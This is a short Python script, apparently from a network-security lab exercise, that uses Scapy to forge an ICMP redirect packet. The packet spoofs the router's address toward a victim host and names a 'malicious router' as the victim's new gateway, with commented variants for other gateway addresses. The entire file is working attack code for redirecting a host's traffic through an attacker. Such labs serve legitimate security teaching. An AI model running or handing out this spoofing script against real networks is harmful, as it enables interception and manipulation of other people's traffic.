#!/usr/bin/python3
from scapy.all import *
ip = IP(src = '10.9.0.11', dst = '10.9.0.5')

icmp = ICMP(type=5, code=1)
# set the new gateway to malicious router
icmp.gw = '10.9.0.111'
# icmp.gw = '1.2.3.4' # address outside LAN
# icmp.gw = '10.9.0.2' # non-existed address inside LAN

# The enclosed IP packet should be the one that
# triggers the redirect message.
ip2 = IP(src = '10.9.0.5', dst = '192.168.60.5')

send(ip/icmp/ip2/ICMP())
